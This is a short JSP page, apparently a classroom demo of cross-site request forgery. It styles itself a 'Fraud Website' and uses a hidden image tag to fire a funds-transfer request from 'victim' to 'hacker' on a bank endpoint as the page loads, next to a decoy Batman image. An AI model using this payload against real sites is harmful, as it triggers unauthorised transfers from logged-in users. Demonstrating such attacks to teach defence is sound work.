<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ include file="/WEB-INF/views/commonPage.jsp" %>

<html>
<head>

	<title>Fraud Website</title>
</head>
<body>
<h4>Thanks for visiting my Fraud Website, I triggered a request to transfer funds to my account in case your logged into your bank. You can check it in developer tool.</h4>
<br>
You can see the batman image but you cant see what went behind the scene.<br><br>
<img src="<%= application.getContextPath() %>/restricted/bank/transferFunds?from=victim&to=hacker&amount=INR 1" >
<img  src="<%= application.getContextPath() %>/images/batman.PNG">

</body>
</html>
